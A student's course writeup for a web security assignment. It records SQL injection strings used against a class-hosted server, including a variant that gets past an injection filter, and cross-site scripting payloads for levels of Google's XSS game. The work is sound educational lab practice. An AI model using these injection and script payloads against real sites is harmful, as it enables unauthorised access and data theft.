# Writeup 1 - Web I

Name: Connor LoPresti
Section: 0101

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: Connor LoPresti


## Assignment details
This assignment has two parts. It is due by 11/27/19 at 11:59PM.

**There will be late penalty of 5% per day late!**

### Part 1 (40 Pts)

CMSC389R-{h1dd3n_1n_plain_5ight} found on source for main page of http://142.93.136.81/
I know this isn't the flag we are looking for, but I am surprised that it is there at all lol.

CMSC389R-{y0u_ar3_th3_SQ1_ninj@} found through SQL injection of the site.
I noticed in the source code that the different pages were being called with item?id=# and that 1, 2, 3 were being used. This means that there could be another page not indexed with an id that could be found. To show all such pages, I tried to use an SQL injection of http://142.93.136.81:5000/item?id=' OR '1=1;-- -
This resulted in a page error since it detected the Injeciton attack. I swiched it up to http://142.93.136.81:5000/item?id=' || '1=1;-- -
and got all the pages. One of which included the flag.

### Part 2 (60 Pts)
level 1: <script>alert('gotem')</script>
fairly obvious.

level 2: <img src="fake.jpg" onerror=alert('gotem again')/> 
Had to use source and hints and looked up how to use onerror.

level 3: https://xss-game.appspot.com/level3/frame#1' onerror="alert('another one')"
Put this in the adress bar. Had to look at source but remembered the onerror field for images.

level 4: Could not solve. Even using hints I was unable to figure out the solution on my own. Looking up the solution, I was able to disect that We wanted to terminate the startTimer call but this was quite dificult to do. I was able to reproduce this to solve the level. https://xss-game.appspot.com/level4/frame?timer=')%3Balert('bites')%3B('
%3B is needed because ; does not work the way we want it to. So we are closing off the timer call with '); Running the Alert; then reopening the parenthesis with (' so that it doesnt error out. 

level 5: https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('the dust')
Had to look at the source code for this one but it was easier than the last. Knowing that next is just run and not parsed for chars makes it easier to exploit. Use the url above to get to the email enter page with the next param saved as such. This will cause the alert to run. I first tried just alert and <script></script> but neither worked. Has to default to javascript:.

level 6: I could not get this one either. I understand that you can write javascript or html in another webpage and pass that as a parameter to this one. However, I could not find a way to do this effectivly. We talked about this method in class when the attack length is a limited size so I understand the concept. I looked up the solution online and found method using pastebin or github to run php. I didnt include it here as I do not need to get to other levels. 
